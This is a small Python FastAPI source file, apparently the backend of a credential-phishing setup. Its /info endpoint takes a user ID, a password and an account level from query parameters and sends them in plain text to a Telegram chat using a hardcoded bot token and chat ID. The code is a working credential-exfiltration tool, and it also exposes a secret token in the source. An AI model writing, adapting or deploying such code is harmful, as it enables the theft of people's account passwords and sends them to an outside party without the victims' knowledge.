from fastapi import FastAPI, Query
import requests

app = FastAPI(title="Telegram Flash API")

BOT_TOKEN = "8622182891:AAFZrjBvj_iAMTOIXCnmd65tTzZENnB2_UQ"
CHAT_ID = "7326248826"

@app.get("/")
def home():
    return {"status": "API Running 🚀"}

# MAIN ENDPOINT
@app.get("/info")
def send(uid: str = Query(...), password: str = Query(...), level: str = Query(...)):

    text = f"UID: {uid}\nPASSWORD: {password}\nLEVEL: {level}"

    requests.get(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        params={"chat_id": CHAT_ID, "text": text}
    )

    return {"status": "Message Sent To Telegram"}